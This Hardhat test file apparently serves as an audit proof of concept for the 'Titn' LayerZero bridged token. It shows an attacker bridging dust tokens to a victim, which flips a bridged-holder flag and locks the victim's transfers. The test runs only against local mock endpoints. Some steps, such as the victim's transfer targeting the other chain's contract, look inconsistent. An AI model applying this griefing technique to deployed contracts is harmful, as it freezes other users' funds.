import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { expect } from 'chai'
import { Contract, ContractFactory } from 'ethers'
import { deployments, ethers } from 'hardhat'

import { Options } from '@layerzerolabs/lz-v2-utilities'

describe('Titn tests', function () {
    // Constant representing a mock Endpoint ID for testing purposes
    const eidA = 1
    const eidB = 2
    // Other variables to be used in the test suite
    let Titn: ContractFactory
    let EndpointV2Mock: ContractFactory
    let ownerA: SignerWithAddress
    let ownerB: SignerWithAddress
    let endpointOwner: SignerWithAddress
    let user1: SignerWithAddress
    let user2: SignerWithAddress
    let baseTITN: Contract
    let arbTITN: Contract
    let mockEndpointV2A: Contract
    let mockEndpointV2B: Contract
    // Before hook for setup that runs once before all tests in the block
    before(async function () {
        // Contract factory for our tested contract
        Titn = await ethers.getContractFactory('Titn')
        // Fetching the first three signers (accounts) from Hardhat's local Ethereum network
        const signers = await ethers.getSigners()
        ;[ownerA, ownerB, endpointOwner, user1, user2] = signers
        // The EndpointV2Mock contract comes from @layerzerolabs/test-devtools-evm-hardhat package
        // and its artifacts are connected as external artifacts to this project
        const EndpointV2MockArtifact = await deployments.getArtifact('EndpointV2Mock')
        EndpointV2Mock = new ContractFactory(EndpointV2MockArtifact.abi, EndpointV2MockArtifact.bytecode, endpointOwner)
    })

    beforeEach(async function () {
        // Deploying a mock LZEndpoint with the given Endpoint ID
        mockEndpointV2A = await EndpointV2Mock.deploy(eidA)
        mockEndpointV2B = await EndpointV2Mock.deploy(eidB)
        // Deploying two instances of the TITN contract with different identifiers and linking them to the mock LZEndpoint
        baseTITN = await Titn.deploy(
            'baseTitn',
            'baseTITN',
            mockEndpointV2A.address,
            ownerA.address,
            ethers.utils.parseUnits('1000000000', 18)
        )
        arbTITN = await Titn.deploy(
            'arbTitn',
            'arbTITN',
            mockEndpointV2B.address,
            ownerB.address,
            ethers.utils.parseUnits('0', 18)
        )
        // Setting destination endpoints in the LZEndpoint mock for each TITN instance
        await mockEndpointV2A.setDestLzEndpoint(arbTITN.address, mockEndpointV2B.address)
        await mockEndpointV2B.setDestLzEndpoint(baseTITN.address, mockEndpointV2A.address)
        // Setting each TITN instance as a peer of the other in the mock LZEndpoint
        await baseTITN.connect(ownerA).setPeer(eidB, ethers.utils.zeroPad(arbTITN.address, 32))
        await arbTITN.connect(ownerB).setPeer(eidA, ethers.utils.zeroPad(baseTITN.address, 32))
    })

    it('malicious user can bridged token to others to lock thier non-bridged tokens', async function () {
        const attacker = user1
        const victim = user2

        // mint non-bridged TITN to victim (Base)
        const victimNonBridgedTokens = ethers.utils.parseEther('1')
        await baseTITN.connect(ownerA).transfer(victim.address, victimNonBridgedTokens)
        expect(await baseTITN.isBridgedTokenHolder(victim.address)).false

        // mint TITN to attacker (Arb)
        // await arbTITN.connect(ownerB).transfer(attacker.address, ethers.utils.parseEther('1'))
        const attackerTokens = ethers.utils.parseEther('1')
        const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
        const sendParam = [
            eidB,
            ethers.utils.zeroPad(attacker.address, 32), // to attacker
            attackerTokens,
            attackerTokens,
            options,
            '0x',
            '0x',
        ]
        const [nativeFee] = await baseTITN.quoteSend(sendParam, false)
        await baseTITN.send(sendParam, [nativeFee, 0], ownerA.address, { value: nativeFee })

        // Attacker bridges 1 wei to Victim
        const tokensToSend = ethers.utils.parseEther('.000001')
        const attacksSendParam = [
            eidA,
            ethers.utils.zeroPad(victim.address, 32), // to victim
            tokensToSend,
            tokensToSend,
            options,
            '0x',
            '0x',
        ]
        const [attacksNativeFee] = await arbTITN.quoteSend(attacksSendParam, false)
        await arbTITN
            .connect(attacker)
            .send(attacksSendParam, [nativeFee, 0], attacker.address, { value: attacksNativeFee })

        // POC: Victim attempts to transfer non-bridged tokens, Fails due to boolean flag.
        expect(await baseTITN.isBridgedTokenHolder(victim.address)).true
        try {
            await arbTITN.connect(victim).transfer(ownerB.address, victimNonBridgedTokens)
            expect.fail('Transaction should have reverted')
        } catch (error: any) {
            expect(error.message).to.include('BridgedTokensTransferLocked')
        }
    })
})
